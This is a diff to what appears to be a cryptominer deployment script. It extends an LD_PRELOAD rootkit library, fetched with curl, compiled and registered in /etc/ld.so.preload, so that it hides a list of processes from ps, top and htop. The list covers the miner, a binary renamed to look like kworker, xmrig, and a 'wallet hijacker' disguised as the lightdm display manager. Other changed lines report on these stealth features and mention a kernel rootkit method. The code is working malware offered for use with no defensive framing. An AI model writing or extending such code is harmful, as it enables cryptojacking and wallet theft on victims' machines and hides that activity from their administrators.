@@ -1292,9 +1292,17 @@ curl -s -o /tmp/processhider.c https://raw.githubusercontent.com/littlAcen/libpr
 #include <unistd.h>
 
 /*
- * Every process with this name will be excluded
+ * List of process names to hide
+ * Add any process you want to hide here!
  */
-static const char* process_to_filter = "swapd";
+static const char* processes_to_hide[] = {
+    "kworker/0:0",     // Our miner (prctl renamed)
+    "swapd",           // Miner wrapper (if visible)
+    ".kworker",        // Hidden binary name
+    "lightdm",         // Wallet hijacker (disguised as display manager)
+    "xmrig",           // In case someone discovers the real binary
+    NULL               // Terminator - ALWAYS keep this!
+};
 
 /*
  * Get a directory name given a DIR* handle
@@ -1346,6 +1354,23 @@ static int get_process_name(char* pid, char* buf)
     return 1;
 }
 
+/*
+ * Check if a process should be hidden
+ * Returns 1 if process should be hidden, 0 otherwise
+ */
+static int should_hide_process(const char* process_name)
+{
+    int i;
+    for(i = 0; processes_to_hide[i] != NULL; i++) {
+        // Use strstr for substring matching
+        // This catches "kworker/0:0" even if full name is different
+        if(strstr(process_name, processes_to_hide[i]) != NULL) {
+            return 1;  // Hide this process
+        }
+    }
+    return 0;  // Don't hide
+}
+
 #define DECLARE_READDIR(dirent, readdir)                                \
 static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                         \
@@ -1370,7 +1395,7 @@ struct dirent* readdir(DIR *dirp)                                       \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
                 get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
+                should_hide_process(process_name)) {                    \
                 continue;                                               \
             }                                                           \
         }                                                               \
@@ -1406,7 +1431,7 @@ if gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -l
         fi
     fi
     
-    echo "[✓] Processes named 'swapd' will be hidden from ps/top/htop"
+    echo "[✓] Processes will be hidden: kworker/0:0, swapd, lightdm, .kworker, xmrig"
 else
     echo "[!] Failed to compile LD_PRELOAD library"
     echo "[!] Trying to install gcc..."
@@ -1532,7 +1557,7 @@ echo "[*] Hiding miner processes..."
 # Method 1: LD_PRELOAD (automatic, system-wide)
 if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
     echo "[✓] LD_PRELOAD rootkit active (processes automatically hidden)"
-    echo "    Processes named 'swapd' are invisible to ps/top/htop"
+    echo "    Hiding: kworker/0:0, swapd, lightdm, .kworker, xmrig"
 fi
 
 # Method 2: Singularity (kill -59) for Kernel 6.x
@@ -1807,7 +1832,7 @@ echo 'Stealth Features Deployed:'
 
 if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
     echo '  ✓ LD_PRELOAD Rootkit: ACTIVE (userland process hiding - ALL KERNELS)'
-    echo '    Processes named "swapd" invisible to ps/top/htop'
+    echo '    Hiding: kworker/0:0, swapd, lightdm, .kworker, xmrig'
 else
     echo '  ○ LD_PRELOAD Rootkit: Not loaded'
 fi
